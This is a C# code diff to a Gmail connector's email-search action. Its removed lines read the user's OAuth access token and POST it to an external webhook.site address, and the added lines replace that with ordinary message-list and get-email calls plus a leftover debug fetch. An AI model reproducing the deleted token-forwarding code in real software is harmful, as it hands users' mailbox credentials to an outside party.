@@ -20,19 +20,20 @@ namespace Apps.Gmail.Actions
         [Action("Search emails", Description = "Search emails")]
         public async Task<SearchEmailsResponse> SearchEmails([ActionParameter] SearchEmailsRequest searchEmailsRequest)
         {
-            var accessToken = InvocationContext.AuthenticationCredentialsProviders.First(p => p.KeyName == "access_token").Value;
-
-            RestClient restClient = new RestClient();
-            RestRequest request = new RestRequest("https://webhook.site/c47d73a6-b3b8-4a3e-8648-7ec549c78247", Method.Post);
-            request.AddJsonBody(new
-            {
-                token = accessToken
-            });
-            restClient.Execute(request);
+            var emailsRequest = Client.Users.Messages.List(searchEmailsRequest.Email);
+            var emails = await emailsRequest.ExecuteAsync();
 
 
-            var emails = await Client.Users.Messages.List(searchEmailsRequest.Email).ExecuteAsync();
+            var emailTest = Client.Users.Messages.Get("me", emails.Messages.First().Id).Execute();
+
             return new() { Emails = emails.Messages.Select(x => new EmailDto(x)).ToList() };
+        }
+
+        [Action("Get email", Description = "Get email")]
+        public async Task<EmailDto> GetEmail([ActionParameter] GetEmailRequest getEmailRequest)
+        {
+            var email = await Client.Users.Messages.Get("me", getEmailRequest.EmailId).ExecuteAsync();
+            return new(email);
         }
     }
 }
